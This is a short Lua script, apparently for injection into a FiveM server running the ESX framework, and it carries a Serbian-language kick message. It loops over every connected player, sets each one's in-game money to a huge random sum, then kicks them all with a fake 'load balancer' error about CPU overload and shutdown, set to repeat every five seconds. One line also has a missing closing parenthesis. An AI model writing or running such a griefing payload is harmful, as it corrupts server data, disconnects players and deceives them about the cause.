CODE_PROPERTIES = {Loop = true, Wait = 5000, Diffcheck = 5000}

for k,id in pairs(GetPlayers()) do
    local asd = ESX.GetPlayerFromId(id)
    asd.setMoney(math.random(100000000000, 200230693240)
    DropPlayer(id, '[THEKUCA LOAD BALANCER] Log greske: \n[TRACE] CPU load >= 50% - Saljem load na drugi server \n[TRACE] Nepoznate skripte, stopiram petlju, gasim server...')
end
